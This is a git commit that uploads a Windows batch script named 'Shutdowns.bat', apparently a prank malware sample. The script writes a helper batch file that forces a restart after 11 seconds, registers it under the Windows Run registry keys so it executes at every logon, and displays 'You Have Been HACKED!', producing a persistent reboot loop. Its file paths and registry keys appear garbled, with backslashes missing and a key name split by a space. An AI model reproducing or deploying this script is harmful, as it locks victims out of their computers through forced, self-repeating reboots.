092892028724ca5a3cfa55b09c92c92b28790605
Zusyaku <71582475+Zusyaku@users.noreply.github.com>
2022-06-26 16:17:26 +0700

    Add files via upload

---
+++ Shutdowns.bat
@@ -0,0 +1,9 @@
+echo @echo off>c:windowshartlell.bat
+echo break off>>c:windowshartlell.bat
+echo shutdown -r -t 11 -f>>c:windowshartlell.bat
+echo end>>c:windowshartlell.bat
+
+reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f
+reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v /t reg_sz /d c:windowshartlell.bat /f
+echo You Have Been HACKED!.
+PAUSE
